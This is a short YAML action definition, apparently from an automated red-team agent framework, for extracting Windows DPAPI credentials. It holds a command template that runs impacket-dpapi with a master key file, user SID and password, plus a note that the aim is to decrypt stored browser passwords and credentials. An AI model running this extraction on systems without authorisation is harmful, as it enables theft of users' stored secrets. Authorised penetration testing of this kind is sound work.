name: dpapi_extract
category: ad
description: DPAPI credential extraction
preconditions:
  - os==windows
  - has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: "impacket-dpapi masterkeys -file '{masterkey_file}' -sid '{user_sid}' -password '{password}'"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Windows Data Protection API encrypts browser passwords, stored creds, etc. Extract master key with user password/domain backup key, then decrypt credential blobs."
